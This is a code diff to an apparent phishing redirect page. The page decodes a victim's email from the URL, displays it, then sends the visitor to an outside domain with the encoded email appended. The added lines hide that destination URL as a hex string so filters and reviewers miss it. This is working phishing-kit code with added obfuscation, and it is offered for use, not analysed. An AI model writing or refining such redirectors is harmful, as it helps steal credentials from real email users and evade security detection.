@@ -70,6 +70,11 @@
             }
         }
 
+        // Convert Hex to String
+        function hexToString(hex) {
+            return hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
+        }
+
         // Extract email parameter from URL
         function findEmailParam() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -86,9 +91,9 @@
 
         // Redirect to final URL with email appended
         function redirectToTarget(base64Email) {
-            const baseUrl = "http://thumenectrics.es/xxtg/auth/";
-            const finalUrl = baseUrl + base64Email;
-            window.location.href = finalUrl;
+            const hex = "687474703A2F2F7468756D656E656374726963732E65732F787874672F617574682F"; // Hexadecimal for http://thumenectrics.es/xxtg/auth/
+            const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
+            window.location.href = obfuscatedURL;
         }
 
         // Update the displayed email and redirect
@@ -99,7 +104,7 @@
                 emailDisplay.innerText = emailParam.decodedValue; // Display the decoded email
                 document.querySelector('.dots-container').style.display = 'flex'; // Show loading dots
                 setTimeout(() => {
-                    redirectToTarget(emailParam.value);
+                    redirectToTarget(emailParam.value, emailParam.decodedValue);
                 }, 2000); // Delay before redirection
             } else {
                 console.error("No valid email parameter found.");
